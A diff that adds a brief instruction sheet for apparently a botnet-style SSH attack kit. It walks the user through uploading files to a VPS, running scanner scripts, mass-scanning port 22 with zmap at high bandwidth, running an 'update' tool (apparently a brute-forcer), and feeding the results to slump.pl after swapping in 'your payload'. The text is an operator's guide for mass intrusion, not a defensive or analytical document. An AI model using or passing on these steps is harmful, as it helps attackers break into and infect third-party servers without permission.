@@ -1,0 +1,24 @@
+
+
+
+ change payload to your payload in slump.pl
+
+ drag files all files into vps
+
+
+
+  1. sh Scanner.sh          if it asks for [Yes] press enter
+                            if it asks for [autodetect] press enter
+
+  2. sh zmap.sh
+
+ 3 .cpan force install Parallel::ForkManager
+
+
+ 4.chmod 777 * 
+
+    5.zmap -p22 -w (your list) -o mfu.txt -B100M
+
+         6.   ./update 2500 
+
+         7. perl slump.pl vuln.txt
